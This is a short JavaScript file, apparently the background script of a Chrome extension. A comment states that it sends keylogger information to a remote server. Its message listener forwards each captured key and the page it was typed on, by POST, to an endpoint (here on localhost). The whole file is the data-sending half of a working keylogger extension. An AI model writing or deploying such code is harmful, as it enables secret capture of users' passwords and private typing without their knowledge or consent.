// Sends keylogger info to remote server
function handleMessage (request) {

    data = "key=" + request.key + "&page=" + request.page;

    fetch('http://localhost:8000/owo-extension', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: data,
    }).then((response) => {
        return response;
    })
}

chrome.runtime.onMessage.addListener(handleMessage);